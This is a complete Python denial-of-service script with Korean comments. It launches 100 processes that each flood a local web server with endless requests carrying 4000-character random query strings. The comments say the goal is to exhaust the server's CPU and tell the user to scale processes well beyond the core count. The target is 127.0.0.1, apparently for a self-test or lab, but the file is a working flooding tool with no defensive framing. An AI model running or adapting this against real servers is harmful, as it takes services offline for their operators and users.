import requests
from multiprocessing import Process
import random
import string

url = "http://127.0.0.1/"


def attack():
    print("CPU 타격 공격 시작...")
    while True:
        try:
            # 1. 존재하지 않는 경로 무한 요청 (서버가 파일 시스템을 뒤지게 만듦)
            # 2. 아주 긴 랜덤 문자열 전송 (서버가 이 데이터를 해석하느라 CPU 사용)
            random_str = ''.join(random.choices(string.ascii_letters + string.digits, k=4000))

            # 서버가 이 긴 데이터를 파싱(해석)하게 강제함
            requests.get(url, params={"search": random_str}, timeout=0.3)

        except:
            pass


if __name__ == "__main__":
    # 프로세스를 확 늘리세요 (내 CPU 코어 수의 5배 이상)
    for i in range(100):
        Process(target=attack).start()